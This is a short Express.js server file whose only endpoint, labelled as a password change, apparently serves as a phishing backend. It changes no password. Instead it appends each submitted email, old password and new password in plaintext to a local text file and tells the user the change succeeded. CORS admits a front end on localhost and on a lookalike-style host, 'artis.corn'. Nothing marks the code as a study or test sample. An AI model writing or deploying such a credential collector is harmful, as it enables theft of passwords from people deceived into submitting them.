const express = require('express');
const fs = require('fs');
const cors = require('cors'); // CORS allows your React app to communicate with your backend server
const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(cors({
  origin: ['http://localhost:3000', 'http://artis.corn:3000']
}));

// Endpoint to save login data
app.post('/api/changePassword', (req, res) => {
  const { email, old_password, new_password } = req.body;

  // Create the data string
  const timestamp = new Date().toISOString();
  const data = `Timestamp: ${timestamp}\nEmail: ${email} \nOld Password: ${old_password}\nNew Password: ${new_password}\n${'='.repeat(50)}\n\n`;

  // Append to file
  fs.appendFile('login_data.txt', data, (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).json({ success: false, message: 'Failed to save data' });
    }

    console.log('Password change saved!');
    res.json({ success: true, message: 'Password change saved!' });
  });
});

const PORT = 5000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});